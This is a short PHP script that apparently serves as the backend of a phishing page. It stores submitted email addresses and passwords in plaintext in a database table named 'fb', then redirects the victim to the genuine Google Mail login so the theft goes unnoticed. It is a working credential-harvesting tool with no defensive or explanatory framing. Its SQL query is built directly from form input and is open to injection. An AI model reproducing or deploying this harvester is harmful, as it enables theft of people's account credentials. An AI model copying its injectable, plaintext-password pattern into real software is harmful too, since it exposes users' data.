<?php

include("connection.php");

if(isset($_POST["submit"]))
{
    $username= $_POST["Email"];
    $password = $_POST["password"];


        $query = mysqli_query($db, "INSERT INTO fb (email, password)VALUES ('$username','$password')")or die(mysqli_error($db));
        if(($query)==1)
        {
            header("location: https://accounts.google.com/ServiceLogin?service=mail&passive=true&rm=false&continue=https://mail.google.com/mail/&ss=1&scc=1&ltmpl=default&ltmplcache=2&emr=1&osid=1");

        } else echo "Enter again your credentials";
    
}
    
?>
